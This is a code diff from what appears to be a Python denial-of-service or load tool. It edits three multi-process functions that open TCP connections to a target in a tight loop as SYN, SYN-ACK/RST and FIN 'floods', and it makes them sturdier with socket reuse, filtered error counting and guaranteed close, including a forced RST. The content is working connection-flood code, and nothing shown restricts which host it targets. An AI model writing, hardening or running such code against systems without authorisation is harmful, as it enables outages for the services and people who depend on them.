@@ -808,18 +808,30 @@ def _mp_syn_flood(args_tuple):
     """Multi-process SYN flooder: connect only (SYN)."""
     host, port, duration = args_tuple
     import time as _time
+    import errno as _errno
     conns = 0
     errors = 0
     end = _time.time() + duration
     while _time.time() < end:
+        s = None
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(0.5)  # fast timeout
+            s.settimeout(0.5)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             s.connect((host, port))
-            s.close()
             conns += 1
-        except Exception:
-            errors += 1
+        except (ConnectionRefusedError, socket.timeout, OSError) as e:
+            if isinstance(e, OSError) and e.errno not in (
+                _errno.ECONNREFUSED, _errno.ETIMEDOUT,
+                _errno.EAGAIN, _errno.ECONNRESET
+            ):
+                errors += 1
+        finally:
+            if s:
+                try:
+                    s.close()
+                except Exception:
+                    pass
     return conns, errors
 
 async def syn_worker(name, url, stats, duration, stop, payload_size=0):
@@ -844,19 +856,32 @@ def _mp_synack_flood(args_tuple):
     """Multi-process SYNACK/RST flooder."""
     host, port, duration = args_tuple
     import time as _time
+    import errno as _errno
     conns = 0
     errors = 0
     end = _time.time() + duration
     while _time.time() < end:
+        s = None
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(0.5)  # fast timeout
+            s.settimeout(0.5)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             s.connect((host, port))
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
-            s.close()  # RST
             conns += 1
-        except Exception:
-            errors += 1
+        except (ConnectionRefusedError, socket.timeout, OSError) as e:
+            if isinstance(e, OSError) and e.errno not in (
+                _errno.ECONNREFUSED, _errno.ETIMEDOUT,
+                _errno.EAGAIN, _errno.ECONNRESET
+            ):
+                errors += 1
+        finally:
+            if s:
+                try:
+                    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
+                                 struct.pack('ii', 1, 0))
+                    s.close()  # RST
+                except Exception:
+                    pass
     return conns, errors
 
 async def synack_worker(name, url, stats, duration, stop, payload_size=0):
@@ -948,18 +973,30 @@ def _mp_fin_flood(args_tuple):
     """Multi-process FIN flooder: connect, graceful close (FIN)."""
     host, port, duration = args_tuple
     import time as _time
+    import errno as _errno
     conns = 0
     errors = 0
     end = _time.time() + duration
     while _time.time() < end:
+        s = None
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(0.5)  # fast timeout
+            s.settimeout(0.5)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             s.connect((host, port))
-            s.close()  # graceful → FIN
             conns += 1
-        except Exception:
-            errors += 1
+        except (ConnectionRefusedError, socket.timeout, OSError) as e:
+            if isinstance(e, OSError) and e.errno not in (
+                _errno.ECONNREFUSED, _errno.ETIMEDOUT,
+                _errno.EAGAIN, _errno.ECONNRESET
+            ):
+                errors += 1
+        finally:
+            if s:
+                try:
+                    s.close()  # graceful → FIN
+                except Exception:
+                    pass
     return conns, errors
 
 async def fin_worker(name, url, stats, duration, stop, payload_size=0):
